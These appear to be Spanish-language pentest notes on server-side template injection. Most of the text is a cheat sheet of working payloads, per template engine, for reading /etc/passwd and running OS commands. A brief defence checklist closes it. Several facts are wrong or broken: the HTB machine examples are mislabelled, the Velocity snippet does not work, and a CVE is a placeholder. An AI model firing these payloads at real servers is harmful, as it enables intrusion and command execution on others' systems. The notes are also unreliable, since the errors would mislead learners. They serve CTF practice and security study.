## 📚 Índice

- [[#🎯 1. ¿Qué es SSTI y por qué existe?]]
- [[#🔍 2. Cómo detectar SSTI (el método universal)]]
    - [[#2.1 ¿Se refleja el input? → Prueba matemática]]
    - [[#2.2 Prueba de contexto (motor de plantillas)]]
- [[#🧠 3. Cómo funciona internamente un motor de plantillas]]
- [[#⚡ 4. Reconocimiento: ¿qué motor usa la aplicación?]]
    - [[#4.1 Indicadores de Jinja2 (Python / Flask / Django)]]
    - [[#4.2 Twig (PHP)]]
    - [[#4.3 Liquid (Shopify, Jekyll)]]
    - [[#4.4 Freemarker (Java)]]
    - [[#4.5 Velocity (Java)]]
    - [[#4.6 Smarty (PHP)]]
    - [[#4.7 ERB / Rails]]
- [[#🚀 5. Explotación Universal SSTI (metodología práctica)]]
    - [[#5.1 Confirmar]]
    - [[#5.2 Enumerar objetos internos]]
    - [[#5.3 Leer archivos (Jinja2)]]
    - [[#5.4 RCE (Jinja2)]]
- [[#🔥 6. Payloads reales por motor]]
    - [[#6.1 Jinja2 – Python (Flask/Django/Custom)]]
    - [[#6.2 Twig – PHP]]
    - [[#6.3 Liquid – Shopify/Jekyll]]
    - [[#6.4 Freemarker – Java]]
    - [[#6.5 Velocity – Java]]
    - [[#6.6 Smarty – PHP]]
    - [[#6.7 ERB – Ruby on Rails]]
    - [[#6.8 Mustache / Handlebars]]
- [[#🧩 7. Cómo hacer RCE real con SSTI (los métodos que sí funcionan)]]
- [[#🏆 8. Casos reales (HTB/CTF)]]
- [[#🛡️ 9. Cómo defender ]]

---

# 🎯 1. ¿Qué es SSTI y por qué existe?

**SSTI (Server-Side Template Injection)** ocurre cuando el usuario controla **parte o todo** de una plantilla que el servidor evalúa dinámicamente.

Ejemplo simplificado:

```python
template = "Hola " + nombre_usuario
render(template)
```

Si `nombre_usuario = "{{7*7}}"`, y el motor es Jinja2, entonces **el servidor ejecuta esa expresión** y devuelve:

```
49
```

Esto ocurre porque los motores de plantillas permiten:

✔ lógica  
✔ operaciones  
✔ funciones internas  
✔ acceso a objetos internos  
✔ acceso a librerías del lenguaje  
✔ y en casos avanzados… **acceso al sistema operativo (OS_COMMAND)**

Por eso **SSTI = potencial RCE**.

---

# 🔍 2. Cómo detectar SSTI (el método universal)

## 2.1 ¿Se refleja el input? → Prueba matemática

Prueba:

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
[[ 7*7 ]]
```

Si aparece **49**, **14**, **343**, _cualquier resultado_ → SSTI confirmado.

---

## 2.2 Prueba de contexto (motor de plantillas)

Para saber qué motor es, envía:

```
{{7*7}}
{{7*'7'}}
{{7/0}}
{{config}}
{{self}}
{{().__class__}}
```

La respuesta del servidor revela el motor.

---

# 🧠 3. Cómo funciona internamente un motor de plantillas

Los motores toman un string y lo convierten en código real.

Ejemplo Jinja2:

```
Hola {{ user }}
```

→ Se convierte en Python:

```python
output = "Hola " + context["user"]
```

Si puedes alterar la plantilla, **alteras el código que se ejecuta**.

---

# ⚡ 4. Reconocimiento: ¿qué motor usa la aplicación?

### 4.1 Indicadores de Jinja2 (Python / Flask / Django)

- Respuesta al operador `{{ 7*7 }}`
    
- Presencia de `.py`, Flask, Werkzeug
    
- Header: `Server: Werkzeug`
    
- Extensiones: `.jinja`, `.j2`
    
- Template error con stacktrace Python
    

### 4.2 Twig (PHP)

- Sintaxis idéntica a Jinja2 (`{{ }}`)
    
- Headers PHP 7/8
    
- Frameworks: Laravel, Symfony
    

### 4.3 Liquid (Shopify, Jekyll)

- Sintaxis: `{% %}`, `{{ }}`
    
- Pero **no evalúa matemáticas**
    
- Más seguro: necesita bypasses
    

### 4.4 Freemarker (Java)

- Sintaxis: `${variable}`
    
- Error típico:
    

```
Expression test is undefined.
```

### 4.5 Velocity (Java)

- Sintaxis: `#set`, `$variable`
    

### 4.6 Smarty (PHP)

- Sintaxis: `{$variable}`
    

### 4.7 ERB / Rails

- Sintaxis: `<%= %>`
    
- Stacktrace Ruby
    

---

# 🚀 5. Explotación Universal SSTI (metodología práctica)

## 5.1 Confirmar

```
{{7*7}}
```

## 5.2 Enumerar objetos internos

```
{{ self }}
{{ self.__class__ }}
{{ config }}
```

## 5.3 Leer archivos (Jinja2)

```
{{ self.__init__.__globals__['open']('/etc/passwd').read() }}
```

## 5.4 RCE (Jinja2)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

---

# 🔥 6. Payloads reales por motor

## 6.1 Jinja2 – Python (Flask/Django/Custom)

**Confirmación**

```
{{7*7}}
```

**Leer archivo**

```
{{ self.__init__.__globals__['open']('/etc/passwd').read() }}
```

**RCE full**

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## 6.2 Twig – PHP

**Confirmación**

```
{{7*7}}
```

**Enumerar funciones**

```
{{ dump() }}
```

**RCE**

```
{{ _self.env.registerUndefinedFunctionCallback("system") }}
{{ system("id") }}
```

---

## 6.3 Liquid – Shopify/Jekyll

Liquid es más limitado, pero hay bypasses:

**Confirmación**  
Liquid **NO** evalúa 7*7 → necesita contexto.

**RCE indirecto (path traversal)**

```
{{ "/etc/passwd" | file_read }}
```

_Depende de plugins, CTF-style, no es común en producción._

---

## 6.4 Freemarker – Java

**Confirmación**

```
${7*7}
```

**RCE**

```
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 6.5 Velocity – Java

```
#set($x="id")
$cmd = $x
$y = $cmd.execute()
```

---

## 6.6 Smarty – PHP

```
{php}echo system("id");{/php}
```

---

## 6.7 ERB – Ruby on Rails

```
<%= `id` %>
```

---

## 6.8 Mustache / Handlebars

⚠️ **En teoría NO son vulnerables a SSTI (logic-less)**  
❗ En la práctica, muchas implementaciones custom SÍ lo son.

Ejemplo clásico (NodeJS):

```
{{#with "constructor"}}
  {{#with "constructor"}}
    {{#with "constructor"}}
        {{this}}
    {{/with}}
  {{/with}}
{{/with}}
```

Esto te da acceso a `Function()`.

---

# 🧩 7. Cómo hacer RCE real con SSTI (los métodos que sí funcionan)

### Método 1 — Acceso al global scope (Jinja2)

```
{{ self.__init__.__globals__ }}
```

### Método 2 — importación arbitraria

```
{{ __builtins__.__import__('os').popen('ls').read() }}
```

### Método 3 — Clases base → object → type → metaclass hacking

Payload avanzado:

```
{{[].__class__.__base__.__subclasses__() }}
```

Desde ahí:

1. buscar `<class 'subprocess.Popen'>`
    
2. invocarlo para ejecutar comandos
    

---

# 🏆 8. Casos reales (HTB/CTF)

- **HTB — Celestial**: Jinja2 RCE → Shell
    
- **HTB — Poison**: Freemarker RCE
    
- **HTB — Nineveh**: PHP/Twig
    
- **CVE-2022-XXXX** varios templating engines expuestos
    

---

# 🛡️ 9. Cómo defender 

✔ Nunca concatenar strings en plantillas  
✔ Usar renderizado seguro (`render_template` con variables definidas)  
✔ Escapar input del usuario  
✔ Deshabilitar funciones peligrosas (Jinja2 sandbox)  
✔ Validar entrada estrictamente  
✔ WAF que detecte sintaxis de plantillas  
✔ No renderizar templates enviadas por el usuario

---

